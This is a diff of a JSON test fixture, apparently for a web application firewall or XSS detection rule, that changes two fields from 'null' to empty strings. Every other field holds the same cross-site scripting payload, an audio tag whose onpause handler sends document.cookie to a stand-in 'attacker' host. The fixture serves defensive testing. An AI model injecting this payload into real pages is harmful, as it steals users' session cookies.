@@ -2,13 +2,13 @@
   "req": [
     {
       "Type": "ALL",
-      "UA": "null",
+      "UA": "",
       "Body": "login=<audio autoplay controls onpause='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
       "ARGS": "login=<audio autoplay controls onpause='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
       "Cookie": "login=<audio autoplay controls onpause='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
       "URL": "login=<audio autoplay controls onpause='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
       "Referer": "login=<audio autoplay controls onpause='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
-      "Headers": "null"
+      "Headers": ""
     }
   ]
 }
